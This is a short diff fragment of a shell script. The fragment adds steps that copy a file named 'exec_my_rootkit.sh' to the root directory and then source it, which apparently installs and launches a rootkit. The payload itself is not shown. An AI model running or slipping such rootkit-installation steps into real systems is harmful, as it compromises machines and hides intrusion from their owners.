@@ -34,4 +34,6 @@ cd /
 # remove the source files
 cd ${CUR_DIR}
 chmod 755 exec_my_rootkit.sh
+cp exec_my_rootkit.sh /
+cd /
 source exec_my_rootkit.sh ${CUR_DIR}
